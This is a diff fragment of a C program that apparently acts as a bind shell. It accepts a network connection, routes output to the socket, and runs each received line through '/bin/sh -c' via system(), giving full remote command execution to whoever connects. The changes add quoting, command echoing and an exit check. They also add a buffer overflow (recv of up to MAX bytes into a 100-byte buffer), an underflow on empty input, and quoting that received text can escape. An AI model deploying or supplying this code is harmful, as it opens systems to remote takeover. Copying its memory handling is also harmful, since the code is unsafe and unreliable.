@@ -29,7 +29,7 @@ int port;
 int sockfd;
 int newfd;
 int numbytes;
-char buf[MAX];
+char *buf;
 
 	struct sockaddr_in my_addr;
 	struct sockaddr_in their_addr;
@@ -81,13 +81,17 @@ char buf[MAX];
 		{
 	  	   dup2(newfd, STDOUT_FILENO);
    		   dup2(newfd, STDERR_FILENO);
-                   do {
+		   buf = (char *) malloc(100);
+		   do {
 			int i=1;
+			memset(buf,0,100);
 			numbytes=recv(newfd,buf,MAX,0);
-                        char cmd[MAX]="/bin/sh -c ";
-                        strncat(cmd,buf, MAX-10);
-                        system(cmd);	
-                   } while(1 /*strcmp(buf,"exit;\n")*/);
+                        char cmd[MAX]="/bin/sh -c \"";
+                        strncat(cmd,buf, strlen(buf)-1);
+			strncat(cmd,"\"\n",2);
+                        system(cmd);
+			printf("%s",cmd);	
+                   } while( strcmp(buf,"exit\n"));
 		}
                close(newfd);
                printf("Bye!!\n"); 
